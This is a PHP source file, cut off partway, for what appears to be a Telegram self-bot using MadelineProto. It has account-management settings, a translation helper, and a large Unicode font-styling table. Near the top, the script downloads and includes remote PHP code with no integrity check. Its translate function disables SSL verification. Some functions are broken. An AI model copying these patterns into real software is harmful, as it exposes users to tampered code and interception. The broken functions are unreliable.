<?php
date_default_timezone_set('Asia/Tehran');

use danog\MadelineProto\Logger;
use danog\MadelineProto\Settings;
use danog\MadelineProto\Settings\AppInfo;
use danog\Loop\GenericLoop as loop;
use danog\Loop\Generic\GenericLoop;
use danog\MadelineProto\FileCallback as progress;
use danog\MadelineProto\EventHandler as EH;
use danog\MadelineProto\RPCErrorException as err;
use function Amp\File\{get, put, exists, unlink};



mkdir ("data");
if (!file_exists('data/lastupdate.txt')) {
file_put_contents('data/lastupdate.txt', time());
}
if (!file_exists('data/uptime.txt')) {
file_put_contents('data/uptime.txt', time());
}
if (!file_exists("data/data.json")) {
file_put_contents('data/data.json', '
{
"Mode":"off",
"ParseMode":"bold",
"AntiLogin":"off",
"TimeBio" : "off",
"TimeName" : "off",
"Mutes":[0],
"MutePv":[0],
"NameRand":"off",
"protection":"off",
"spam":[],
"SafeAntiPv":[],
"limit":"5",
"Name":"Fuck",
"antipv":"off",
"JoinMode":"mute",
"enm":[],
"Join":[],
"AnimatedSticker":[],
"Reply":[],
"Pin":[],
"Game":[],
"LongText":[],
"Service":[],
"Video":[],
"RVideo":[],
"Poll":[],
"File":[],
"Link":[],
"UserName":[],
"TextMessage":[],
"EnglishText":[],
"FarsiText":[],
"Photo":[],
"Document":[],
"Voice":[],
"Forward":[],
"Sticker":[],
"Location":[],
"Gif":[],
"Music":[],
"Mention":[],
"Via":[],
"Contact":[],
"Inline":[]
}'
);}

    if (!is_file('madeline.php')) {
        copy('https://phar.madelineproto.xyz/madeline.php', 'madeline.php');
    }
    include 'madeline.php';

function is_english($str)
{
    if (strlen($str) != strlen(utf8_decode($str))) {
        return false;
    } else {
        return true;
    }
}
 function translate($from, $to, $text)
    {

        $text = str_replace("\n", " ", $text);
        $fields = ['sl' => urlencode($from), 'tl' => urlencode($to), 'q' => $text];
        $string = '';
        foreach ($fields as $key => $value) {
            $string .= "&" . $key . "=" . $value;
        }
        $ch = curl_init("https://translate.googleapis.com/translate_a/single?client=gtx&dt=t");
        curl_setopt_array($ch, [
            CURLOPT_POSTFIELDS => $string,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => 'UTF-8',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'
        ]);
        $result = json_decode(curl_exec($ch), true);
        foreach ($result[0] as $k => $l) {
            return $l[0];
        }
    }

function align(array $args, string $sep = ': ', string $prefix = '', string $suffix = '', bool $mb = false): string
{
    [$result, $maxLength, $method] = ['', 0, $mb ? 'mb_strlen' : 'strlen'];
    foreach ($args as $key => $val) {
        if ($method($key) > $maxLength) {
            $maxLength = $method($key);
        }
    }
    }
       function getAllDeletes($chat_id)
    {
        try {
            $result = [];
            $offset = 0;
            while (true) {
$participants = yield $this->channels->getParticipants([
'channel' => $chat_id,
'filter' => ['_' => 'channelParticipantsRecent'],
'offset' => $offset,
'limit'  => 200
]);
foreach ($participants['users'] as $member) {
if ($member['deleted']) {
$result[] = [
'id'        => $member['id']
];
}
}
$count = count($participants['users']);
$offset += $count;
if ($count === 0) {
break;
}
            }
            return $result;
        } catch (\Throwable $e) {
            $m = $e->getMessage();
            return $m;
        }
    }
function font($str)
{
    $texts = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
    $font =
        [
            ['ⓠ', 'ⓦ', 'ⓔ', 'ⓡ', 'ⓣ', 'ⓨ', 'ⓤ', 'ⓘ', 'ⓞ', 'ⓟ', 'ⓐ', 'ⓢ', 'ⓓ', 'ⓕ', 'ⓖ', 'ⓗ', 'ⓙ', 'ⓚ', 'ⓛ', 'ⓩ', 'ⓧ', 'ⓒ', 'ⓥ', 'ⓑ', 'ⓝ', 'ⓜ', '⓪', '➀', '➁', '➂', '➃', '➄', '➅', '➆', '➇', '➈'],
            ['θ', 'w', 'ε', 'ʀ', 'τ', 'ψ', 'υ', 'ι', 'ɸ', '⅊', 'α', 'ៜ', 'δ', 'ẜ', 'ϑ', 'հ', 'յ', 'Κ', 'ℓ', 'z', 'ϰ', 'ϲ', '⋎', 'β', 'ƞ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ω', 'ɛ', 'я', 'т', 'ʏ', 'ʋ', 'ι', 'σ', 'ρ', 'α', 'ƨ', '∂', 'ғ', 'ɢ', 'н', 'ʝ', 'κ', 'ℓ', 'ʓ', 'ϰ', 'c', 'ѵ', 'в', 'и', 'м', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['🇶 ', '🇼 ', '🇪 ', '🇷 ', '🇹 ', '🇾 ', '🇻 ', '🇮 ', '🇴 ', '🇵 ', '🇦 ', '🇸 ', '🇩 ', '🇫 ', '🇬 ', '🇭 ', '🇯 ', '🇰 ', '🇱 ', '🇿 ', '🇽 ', '🇨 ', '🇺 ', '🇧 ', '🇳 ', '🇲 ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ŵ', 'È', 'ŕ', 'ť', 'ý', 'ú', 'Ì', 'ő', 'p', 'á', 'ś', 'ď', 'f', 'ġ', 'ĥ', 'j', 'k', 'l', 'ź', 'x', 'ć', 'v', 'b', 'ń', 'm', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ʠ', 'w', 'ę', 'ŗ', 'ţ', 'ƴ', 'ų', 'į', 'ǫ', 'ƥ', 'ą', 'ş', 'd', 'ƒ', 'ɠ', 'ђ', 'ʝ', 'ķ', 'ɭ', 'ʐ', 'ҳ', 'ç', 'v', 'ɓ', 'ŋ', 'ɱ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ꮕ', 'Ꮿ', 'Ꭼ', 'Ꮢ', 'Ꮏ', 'Ꮍ', 'Ꮼ', 'Ꭸ', 'Ꮎ', 'Ꮲ', 'Ꭿ', 'Ꮥ', 'Ꭰ', 'Ꮀ', 'Ꮆ', 'Ꮋ', 'Ꮰ', 'Ꮶ', 'Ꮭ', 'Ꮓ', 'Ꮂ', 'Ꮸ', 'Ꮙ', 'Ᏸ', 'Ꮑ', 'Ꮇ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̸', 'w̸', 'e̸', 'r̸', 't̸', 'y̸', 'u̸', 'i̸', 'o̸', 'p̸', 'a̸', 's̸', 'd̸', 'f̸', 'g̸', 'h̸', 'j̸', 'k̸', 'l̸', 'z̸', 'x̸', 'c̸', 'v̸', 'b̸', 'n̸', 'm̸', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̲̅', 'w̲̅', 'e̲̅', 'r̲̅', 't̲̅', 'y̲̅', 'u̲̅', 'i̲̅', 'o̲̅', 'p̲̅', 'a̲̅', 's̲̅', 'd̲̅', 'f̲̅', 'g̲̅', 'h̲̅', 'j̲̅', 'k̲̅', 'l̲̅', 'z̲̅', 'x̲̅', 'c̲̅', 'v̲̅', 'b̲̅', 'n̲̅', 'm̲̅', '0̲̅', '1̲̅', '2̲̅', '3̲̅', '4̲̅', '5̲̅', '6̲̅', '7̲̅', '8̲̅', '9̲̅'],
            ['ᑫ', 'ᗯ', 'Ɛ', 'ᖇ', 'Ƭ', 'Ƴ', 'ᑌ', 'Ɩ', 'O', 'ᑭ', 'ᗩ', 'ᔕ', 'ᗪ', 'F', 'G', 'ℎ', 'ᒍ', 'Ƙ', 'ᒪ', 'ᘔ', '᙭', 'ᑕ', 'ᐯ', 'ᗷ', 'ᑎ', 'ᗰ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̤̈', 'ẅ̤', 'ë̤', 'r̤̈', 'ẗ̤', 'ÿ̤', 'ṳ̈', 'ï̤', 'ö̤', 'p̤̈', 'ä̤', 's̤̈', 'd̤̈', 'f̤̈', 'g̤̈', 'ḧ̤', 'j̤̈', 'k̤̈', 'l̤̈', 'z̤̈', 'ẍ̤', 'c̤̈', 'v̤̈', 'b̤̈', 'n̤̈', 'm̤̈', '0̤̈', '1̤̈', '2̤̈', '3̤̈', '4̤̈', '5̤̈', '6̤̈', '7̤̈', '8̤̈', '9̤̈'],
            ['ｑ', 'ｗ', 'ｅ', 'ｒ', 'ｔ', 'ｙ', 'ｕ', 'ｉ', 'ｏ', 'ｐ', 'ａ', 'ｓ', 'ｄ', 'ｆ', 'ｇ', 'ｈ', 'ｊ', 'ｋ', 'ｌ', 'ｚ', 'ｘ', 'ｃ', 'ｖ', 'ｂ', 'ｎ', 'ｍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'щ', 'ё', 'я', 'т', 'у', 'ц', 'ї', 'о', 'p', 'a', '$', 'd', 'f', 'g', 'н', 'j', 'к', 'l', 'z', 'ж', 'c', 'v', 'в', 'п', 'м', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̶', 'w̶', 'e̶', 'r̶', 't̶', 'y̶', 'u̶', 'i̶', 'o̶', 'p̶', 'a̶', 's̶', 'd̶', 'f̶', 'g̶', 'h̶', 'j̶', 'k̶', 'l̶', 'z̶', 'x̶', 'c̶', 'v̶', 'b̶', 'n̶', 'm̶', '0̶', '1̶', '2̶', '3̶', '4̶', '5̶', '6̶', '7̶', '8̶', '9̶'],
            ['ᖳ', 'ᙡ', 'ᙓ', 'ᖇ', 't', 'Ꭹ', 'ᘎ', 'ᓮ', 'ᗝ', 'ᕈ', 'ᗩ', 'ᔕ', 'ᖙ', 'ℱ', '𐌾', 'ᖺ', 'ᒎ', 'Ḱ', 'ᒪ', 'ᔓ', 'ჯ', 'ᙅ', 'Ⅴ', 'ᕊ', 'ᘉ', 'ᙢ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ợ', 'ฬ', 'є', 'г', 't', '⑂', 'ย', 'เ', '๏', 'ק', 'ค', 'ร', 'Ԁ', 'Ŧ', 'g', 'ђ', 'ן', 'к', 'l', 'z', 'ж', 'ϲ', 'ṽ', 'ƅ', 'ภ', '៣', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'w', 'e', 'r', 'т', 'y', 'υ', 'ι', 'o', 'p', 'a', 'ѕ', 'd', 'ғ', 'g', 'н', 'j', 'ĸ', 'l', 'z', 'х', 'c', 'v', 'в', 'n', 'м', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ℚ', 'Ꮗ', 'ℰ', 'ℛ', '𝒯', 'Ꮍ', 'U', 'ℐ', 'Ꮎ', 'ℙ', 'Ꭿ', 'Ѕ', 'ⅅ', 'ℱ', 'Ꮆ', 'ℋ', 'Ꭻ', 'Ꮶ', 'ℒ', 'ℤ', 'X', 'ℂ', 'Ꮙ', 'ℬ', 'ℕ', 'ℳ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ω', 'є', 'я', 'т', 'у', 'υ', 'ι', 'σ', 'ρ', 'α', 'ѕ', '∂', 'ƒ', 'g', 'н', 'נ', 'к', 'ℓ', 'z', 'χ', '¢', 'ν', 'в', 'η', 'м', '0', 'ı', '2', 'ʓ', '4', '5', 'б', 'ך', '8', '9'],
            ['Ꮕ', 'Ꮿ', 'Ɛ', 'Ŕ', 'Ŧ', 'Y', 'Ʊ', 'Ī', 'Ꮎ', 'Ṗ', 'Λ', 'S', 'D', 'F', 'Ɠ', 'Ĥ', 'Ĵ', 'Ҡ', 'Ŀ', 'Z', 'Ӿ', 'Ƈ', '√', 'ß', 'И', 'M', '0', '①', '②', '③', '④', '⑤', '⑥', '⑦', '⑧', '⑨'],
            ['q', 'ώ', 'έ', 'ŕ', 'ţ', 'ч', 'ù', 'ί', 'ό', 'ρ', 'ά', 'ş', 'đ', 'ғ', 'ģ', 'ħ', 'ј', 'ķ', 'Ļ', 'ž', 'x', 'ς', 'ν', 'в', 'ή', 'м', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ǫ', 'Ш', 'Ξ', 'Я', 'Т', 'Џ', 'U', 'ł', 'Ф', 'P', 'Λ', 'S', 'Ð', 'Ŧ', 'G', 'H', 'J', 'К', 'Ł', 'Z', 'Ж', 'Ͼ', 'V', 'Б', 'Л', 'M', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q̰̃', 'w̰̃', 'ḛ̃', 'r̰̃', 't̰̃', 'ỹ̰', 'ṵ̃', 'ḭ̃', 'õ̰', 'p̰̃', 'ã̰', 's̰̃', 'd̰̃', 'f̰̃', 'g̰̃', 'h̰̃', 'j̰̃', 'k̰̃', 'l̰̃', 'z̰̃', 'x̰̃', 'c̰̃', 'ṽ̰', 'b̰̃', 'ñ̰', 'm̰̃', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['⒬', '⒲', '⒠', '⒭', '⒯', '⒴', '⒰', '⒤', '⒪', '⒫', '⒜', '⒮', '⒟', '⒡', '⒢', '⒣', '⒥', '⒦', '⒧', '⒵', '⒳', '⒞', '⒱', '⒝', '⒩', '⒨', '0', '⑴', '⑵', '⑶', '⑷', '⑸', '⑹', '⑺', '⑻', '⑼'],
            ['Q҉', 'W҉', 'E҉', 'R҉', 'T҉', 'Y҉', 'U҉', 'I҉', 'O҉', 'P҉', 'A҉', 'S҉', 'D҉', 'F҉', 'G҉', 'H҉', 'J҉', 'K҉', 'L҉', 'Z҉', 'X҉', 'C҉', 'V҉', 'B҉', 'N҉', 'M҉', '0҉', '1҉', '2҉', '3҉', '4҉', '5҉', '6҉', '7҉', '8҉', '9҉'],
            ['q͎', 'w͎', 'e͎', 'r͎', 't͎', 'y͎', 'u͎', 'i͎', 'o͎', 'p͎', 'a͎', 's͎', 'd͎', 'f͎', 'g͎', 'h͎', 'j͎', 'k͎', 'l͎', 'z͎', 'x͎', 'c͎', 'v͎', 'b͎', 'n͎', 'm͎', '0͎', '1͎', '2͎', '3͎', '4͎', '5͎', '6͎', '7͎', '8͎', '9͎'],
            ['qͦ', 'wͦ', 'eͦ', 'rͦ', 'tͦ', 'yͦ', 'uͦ', 'iͦ', 'oͦ', 'pͦ', 'aͦ', 'sͦ', 'dͦ', 'fͦ', 'gͦ', 'hͦ', 'jͦ', 'kͦ', 'lͦ', 'zͦ', 'xͦ', 'cͦ', 'vͦ', 'bͦ', 'nͦ', 'mͦ', '0ͦ', '1ͦ', '2ͦ', '3ͦ', '4ͦ', '5ͦ', '6ͦ', '7ͦ', '8ͦ', '9ͦ'],
            ['Q͡', 'W͡', 'E͡', 'R͡', 'T͡', 'Y͡', 'U͡', 'I͡', 'O͡', 'P͡', 'A͡', 'S͡', 'D͡', 'F͡', 'G͡', 'H͡', 'J͡', 'K͡', 'L͡', 'Z͡', 'X͡', 'C͡', 'V͡', 'B͡', 'N͡', 'M͡', '0͡', '1͡', '2͡', '3͡', '4͡', '5͡', '6͡', '7͡', '8͡', '9͡'],
            ['Q⃗', 'W⃗', 'E⃗', 'R⃗', 'T⃗', 'Y⃗', 'U⃗', 'I⃗', 'O⃗', 'P⃗', 'A⃗', 'S⃗', 'D⃗', 'F⃗', 'G⃗', 'H⃗', 'J⃗', 'K⃗', 'L⃗', 'Z⃗', 'X⃗', 'C⃗', 'V⃗', 'B⃗', 'N⃗', 'M⃗', '0⃗', '1⃗', '2⃗', '3⃗', '4⃗', '5⃗', '6⃗', '7⃗', '8⃗', '9⃗'],
            ['Q⃖', 'W⃖', 'E⃖', 'R⃖', 'T⃖', 'Y⃖', 'U⃖', 'I⃖', 'O⃖', 'P⃖', 'A⃖', 'S⃖', 'D⃖', 'F⃖', 'G⃖', 'H⃖', 'J⃖', 'K⃖', 'L⃖', 'Z⃖', 'X⃖', 'C⃖', 'V⃖', 'B⃖', 'N⃖', 'M⃖', '0⃖', '1⃖', '2⃖', '3⃖', '4⃖', '5⃖', '6⃖', '7⃖', '8⃖', '9⃖'],
            ['q͙', 'w͙', 'e͙', 'r͙', 't͙', 'y͙', 'u͙', 'i͙', 'o͙', 'p͙', 'a͙', 's͙', 'd͙', 'f͙', 'g͙', 'h͙', 'j͙', 'k͙', 'l͙', 'z͙', 'x͙', 'c͙', 'v͙', 'b͙', 'n͙', 'm͙', '0͙', '1͙', '2͙', '3͙', '4͙', '5͙', '6͙', '7͙', '8͙', '9͙'],
            ['Q⃕', 'W⃕', 'E⃕', 'R⃕', 'T⃕', 'Y⃕', 'U⃕', 'I⃕', 'O⃕', 'P⃕', 'A⃕', 'S⃕', 'D⃕', 'F⃕', 'G⃕', 'H⃕', 'J⃕', 'K⃕', 'L⃕', 'Z⃕', 'X⃕', 'C⃕', 'V⃕', 'B⃕', 'N⃕', 'M⃕', '0⃕', '1⃕', '2⃕', '3⃕', '4⃕', '5⃕', '6⃕', '7⃕', '8⃕', '9⃕'],
            ['Q͛', 'W͛', 'E͛', 'R͛', 'T͛', 'Y͛', 'U͛', 'I͛', 'O͛', 'P͛', 'A͛', 'S͛', 'D͛', 'F͛', 'G͛', 'H͛', 'J͛', 'K͛', 'L͛', 'Z͛', 'X͛', 'C͛', 'V͛', 'B͛', 'N͛', 'M͛', '0͛', '1͛', '2͛', '3͛', '4͛', '5͛', '6͛', '7͛', '8͛', '9͛'],
            ['Q͌', 'W͌', 'E͌', 'R͌', 'T͌', 'Y͌', 'U͌', 'I͌', 'O͌', 'P͌', 'A͌', 'S͌', 'D͌', 'F͌', 'G͌', 'H͌', 'J͌', 'K͌', 'L͌', 'Z͌', 'X͌', 'C͌', 'V͌', 'B͌', 'N͌', 'M͌', '0͌', '1͌', '2͌', '3͌', '4͌', '5͌', '6͌', '7͌', '8͌', '9͌'],
            ['ᵟ', 'ᵂ', 'ᴱ', 'ᴿ', 'ᵀ', 'ᵞ', 'ᵁ', 'ᴵ', 'ᴼ', 'ᴾ', 'ᴬ', 'ˢ', 'ᴰ', 'ᶠ', 'ᴳ', 'ᴴ', 'ᴶ', 'ᴷ', 'ᴸ', 'ᶻ', 'ˣ', 'ᶜ', 'ᵛ', 'ᴮ', 'ᴺ', 'ᴹ', '⁰', '¹', '²', '³', '⁴', '⁵', '⁶', '⁷', '⁸', '⁹'],
            ['q̾', 'w̾', 'e̾', 'r̾', 't̾', 'y̾', 'u̾', 'i̾', 'o̾', 'p̾', 'a̾', 's̾', 'd̾', 'f̾', 'g̾', 'h̾', 'j̾', 'k̾', 'l̾', 'z̾', 'x̾', 'c̾', 'v̾', 'b̾', 'n̾', 'm̾', '0̾', '1̾', '2̾', '3̾', '4̾', '5̾', '6̾', '7̾', '8̾', '9̾'],
            ['Q҈', 'W҈', 'E҈', 'R҈', 'T҈', 'Y҈', 'U҈', 'I҈', 'O҈', 'P҈', 'A҈', 'S҈', 'D҈', 'F҈', 'G҈', 'H҈', 'J҈', 'K҈', 'L҈', 'Z҈', 'X҈', 'C҈', 'V҈', 'B҈', 'N҈', 'M҈', '0҈', '1҈', '2҈', '3҈', '4҈', '5҈', '6҈', '7҈', '8҈', '9҈'],
            ['q̥', 'w̥', 'e̥', 'r̥', 't̥', 'y̥', 'u̥', 'i̥', 'o̥', 'p̥', 'ḁ', 's̥', 'd̥', 'f̥', 'g̥', 'h̥', 'j̥', 'k̥', 'l̥', 'z̥', 'x̥', 'c̥', 'v̥', 'b̥', 'n̥', 'm̥', '0̥', '1̥', '2̥', '3̥', '4̥', '5̥', '6̥', '7̥', '8̥', '9̥'],
            ['q̽', 'w̽', 'e̽', 'r̽', 't̽', 'y̽', 'u̽', 'i̽', 'o̽', 'p̽', 'a̽', 's̽', 'd̽', 'f̽', 'g̽', 'h̽', 'j̽', 'k̽', 'l̽', 'z̽', 'x̽', 'c̽', 'v̽', 'b̽', 'n̽', 'm̽', '0̽', '1̽', '2̽', '3̽', '4̽', '5̽', '6̽', '7̽', '8̽', '9̽'],
            ['q꙰', 'w꙰', 'e꙰', 'r꙰', 't꙰', 'y꙰', 'u꙰', 'i꙰', 'o꙰', 'p꙰', 'a꙰', 's꙰', 'd꙰', 'f꙰', 'g꙰', 'h꙰', 'j꙰', 'k꙰', 'l꙰', 'z꙰', 'x꙰', 'c꙰', 'v꙰', 'b꙰', 'n꙰', 'm꙰', '0꙰', '1꙰', '2꙰', '3꙰', '4꙰', '5꙰', '6꙰', '7꙰', '8꙰', '9꙰'],
            ['Q͟', 'W͟', 'E͟', 'R͟', 'T͟', 'Y͟', 'U͟', 'I͟', 'O͟', 'P͟', 'A͟', 'S͟', 'D͟', 'F͟', 'G͟', 'H͟', 'J͟', 'K͟', 'L͟', 'Z͟', 'X͟', 'C͟', 'V͟', 'B͟', 'N͟', 'M͟', '0͟', '1͟', '2͟', '3͟', '4͟', '5͟', '6͟', '7͟', '8͟', '9͟'],
            ['Q̳', 'W̳', 'E̳', 'R̳', 'T̳', 'Y̳', 'U̳', 'I̳', 'O̳', 'P̳', 'A̳', 'S̳', 'D̳', 'F̳', 'G̳', 'H̳', 'J̳', 'K̳', 'L̳', 'Z̳', 'X̳', 'C̳', 'V̳', 'B̳', 'N̳', 'M̳', '0̳', '1̳', '2̳', '3̳', '4̳', '5̳', '6̳', '7̳', '8̳', '9̳'],
            ['Q', 'Ш', 'Σ', 'R', 'T', 'Ψ', 'U', 'I', 'Ω', 'P', 'Δ', 'S', 'D', 'Ғ', 'G', 'H', 'J', 'Ҝ', 'L', 'Z', 'X', 'C', '∇', 'β', 'Π', 'M', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ա', 'ɛ', 'ʀ', '⊺', 'ʏ', 'ʊ', 'ɨ', 'օ', 'ք', 'ǟ', 'ֆ', 'ɖ', 'ʄ', 'ɢ', 'ɦ', 'ʝ', 'Ꮶ', 'ʟ', 'ʐ', 'x', 'ƈ', 'ʋ', 'ɮ', 'ռ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ⓠ', 'Ⓦ', 'Ⓔ', 'Ⓡ', 'Ⓣ', 'Ⓨ', 'Ⓤ', 'Ⓘ', 'Ⓞ', 'Ⓟ', 'Ⓐ', 'Ⓢ', 'Ⓓ', 'Ⓕ', 'Ⓖ', 'Ⓗ', 'Ⓙ', 'Ⓚ', 'Ⓛ', 'Ⓩ', 'Ⓧ', 'Ⓒ', 'Ⓥ', 'Ⓑ', 'Ⓝ', 'Ⓜ', '0⃣', '1⃣', '2⃣', '3⃣', '4⃣', '5⃣', '6⃣', '7⃣', '8⃣', '9⃣'],
            ['Q͜͡', 'W͜͡', 'E͜͡', 'R͜͡', 'T͜͡', 'Y͜͡', 'U͜͡', 'I͜͡', 'O͜͡', 'P͜͡', 'A͜͡', 'S͜͡', 'D͜͡', 'F͜͡', 'G͜͡', 'H͜͡', 'J͜͡', 'K͜͡', 'L͜͡', 'Z͜͡', 'X͜͡', 'C͜͡', 'V͜͡', 'B͜͡', 'N͜͡', 'M͜͡', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ῳ', '∑', 'Я', 'ɬ', 'ㄚ', 'ㄩ', 'ⅰ', '◊', 'ㄕ', '∆', '𐒡', '∂', 'ﾓ', 'б', 'ｻ', 'ᴊ', 'к', 'ﾚ', 'z', 'χ', 'ς', '𐀖', '๒', 'и', '㎡', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'w', 'є', 'r', 't', 'ч', 'u', 'í', 'σ', 'p', 'α', 'ѕ', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'х', 'c', 'v', 'в', 'n', 'm', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ẇ', 'є', 'я', 'ṭ', 'ʏ', 'ȗ', 'ı', 'ȏ', 'ƿ', 'ѧ', 'ṡ', 'Ԁ', 'ғ', 'ɢ', 'һ', 'j', 'ҡ', 'ʟ', 'ẓ', '×', 'ċ', 'ṿ', 'ɞ', 'ṅ', 'ṃ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['ꆰ', 'ꅏ', 'ꍟ', 'ꋪ', '꓄', 'ꌩ', 'ꀎ', 'ꀤ', 'ꂦ', 'ᖘ', 'ꍏ', 'ꌗ', 'ꀸ', 'ꎇ', 'ꁅ', 'ꃅ', 'ꀭ', 'ꀘ', '꒒', 'ℤ', 'ꊼ', 'ꉓ', 'ᐯ', 'ꌃ', 'ꈤ', 'ᛗ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'Ꮃ', 'Ꭼ', 'Ꮢ', 'Ҭ', 'Ꮍ', 'u', 'Ꭵ', 'Ꮎ', 'Ꮲ', 'Ꭺ', 's', 'Ꭰ', 'f', 'Ꮆ', 'h', 'j', 'Ꮶ', 'Ꮮ', 'Ꮓ', 'x', 'Ꮯ', 'Ꮙ', 'b', 'Ꮑ', 'm', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ա', 'ҽ', 'ɾ', 'Ե', 'վ', 'մ', 'í', 'օ', 'Թ', 'ɑ', 'Տ', 'ժ', 'ƒ', 'ց', 'հ', 'յ', 'Ƙ', 'Ӏ', 'Հ', '×', 'ϲ', 'ѵ', 'ҍ', 'ղ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ῳ', 'ɛ', 'ཞ', 'ɬ', 'ყ', 'ų', 'ı', 'ơ', '℘', 'ą', 'ʂ', 'ɖ', 'ʄ', 'ɠ', 'ɧ', 'ʝ', 'ƙ', 'Ɩ', 'ʑ', 'ҳ', 'ƈ', '۷', 'ც', 'ŋ', 'ɱ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Q', '₩', 'E', 'Ʀ', '₸', '¥', 'U', 'ł', 'Ø', 'P', 'λ', '$', 'Ð', '₣', 'G', 'Ҥ', 'J', 'ƙ', 'Ł', 'Z', 'X', '₡', 'V', 'B', '₦', 'M', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ա', 'ɛ', 'ʀ', '𐀀', 'ʏ', 'ʊ', 'ɨ', 'օ', 'ք', 'ǟ', 'ֆ', 'ɖ', 'ʄ', 'ɢ', 'ɦ', 'ʝ', 'Ꮶ', 'ʟ', 'ʐ', 'x', 'ƈ', 'ʋ', 'ɮ', 'ռ', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q͠', 'w͠', 'e͠', 'r͠', 't͠', 'y͠', 'u͠', 'i͠', 'o͠', 'p͠', 'a͠', 's͠', 'd͠', 'f͠', 'g͠', 'h͠', 'j͠', 'k͠', 'l͠', 'z͠', 'x͠', 'c͠', 'v͠', 'b͠', 'n͠', 'm͠', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q͓̽', 'w͓̽', 'e͓̽', 'r͓̽', 't͓̽', 'y͓̽', 'u͓̽', 'i͓̽', 'o͓̽', 'p͓̽', 'a͓̽', 's͓̽', 'd͓̽', 'f͓̽', 'g͓̽', 'h͓̽', 'j͓̽', 'k͓̽', 'l͓̽', 'z͓̽', 'x͓̽', 'c͓̽', 'v͓̽', 'b͓̽', 'n͓̽', 'm͓̽', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q͎', 'w͎', 'e͎', 'r͎', 't͎', 'y͎', 'u͎', 'i͎', 'o͎', 'p͎', 'a͎', 's͎', 'd͎', 'f͎', 'g͎', 'h͎', 'j͎', 'k͎', 'l͎', 'z͎', 'x͎', 'c͎', 'v͎', 'b͎', 'n͎', 'm͎', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['Ⴍ', 'w', 'Ꮛ', 'R', '𐌕', 'Ⴤ', 'Ⴎ', 'i', 'ტ', 'Ⴒ', '𐌀', 'Ⴝ', 'მ', 'f', 'Ᏻ', 'Ћ', 'ქ', 'k', 'l', 'ɀ', 'ჯ', 'Ꮳ', 'V', 'Ⴊ', 'Ⴖ', 'ო', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q⃟', 'w⃟', 'e⃟', 'r⃟', 't⃟', 'y⃟', 'u⃟', 'i⃟', 'o⃟', 'p⃟', 'a⃟', 's⃟', 'd⃟', 'f⃟', 'g⃟', 'h⃟', 'j⃟', 'k⃟', 'l⃟', 'z⃟', 'x⃟', 'c⃟', 'v⃟', 'b⃟', 'n⃟', 'm⃟', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['զ', 'ϖ', 'ε', 'ɾ', 'ϯ', 'ψ', 'մ', 'ί', 'σ', 'Թ', 'α', 'န', 'δ', 'ƒ', 'ɡ', 'հ', 'յ', 'Ƙ', 'ʆ', 'Հ', 'X', 'ɕ', 'ѵ', 'ɓ', 'η', 'ʍ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['🆀', '🆆', '🅴', '🆁', '🆃', '🆈', '🆄', '🅸', '🅾', '🅿', '🅰', '🆂', '🅳', '🅵', '🅶', '🅷', '🅹', '🅺', '🅻', '🆉', '🆇', '🅲', '🆅', '🅱', '🅽', '🅼', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
            ['q', 'ཡ', 'ཛ', 'ཞ', '₮', 'ƴ', 'ມ', 'ར', '๑', '♇', 'ศ', 'ຮ', 'อ', 'f', 'g', 'ཏ', 'j', 'K', 'ʆ', 'ƶ', '×', '໒', 'v', '๖', 'ས', 'ฅ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
